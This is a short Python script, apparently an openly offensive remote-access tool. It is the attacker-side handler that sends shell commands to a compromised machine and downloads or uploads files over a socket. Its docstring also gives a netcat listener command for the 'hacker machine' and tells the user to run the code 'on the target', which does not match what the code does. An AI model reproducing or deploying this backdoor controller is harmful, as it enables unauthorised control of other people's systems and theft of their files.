#!/usr/bin/env python3
'''
Do this on hacker machine:

nc -vv -l -p 4444
netcat verbose listen port 4444


Run this code on the target:

'''
import argparse
import socket
import subprocess
from listen import Listener

def get_arg(parser, flag, name, text):
    parser.add_argument("-" + flag, "--" + name, dest=name, help=text)
    return parser

parser = argparse.ArgumentParser()
parser = get_arg(parser, 'p', 'port', 'Port to listen to')
value = parser.parse_args()
port = value.port
listener = Listener(int(port))

cmd = input(">> ")
cmd = cmd.split(" ")
while True:
    listener.send_json(cmd)
    if "close" in cmd[0]:
        break
    reply = listener.recv_json(1024)
    if cmd[0] == "download":
        print(listener.write_file(reply, cmd[1]))
    else:
        print(reply.strip())
    cmd = input(">> ")
    cmd = cmd.split(" ")
    if (cmd[0] == "upload"):
        content = listener.get_file(cmd[1])
        cmd.append(content.decode("utf8"))
listener.close()
exit()




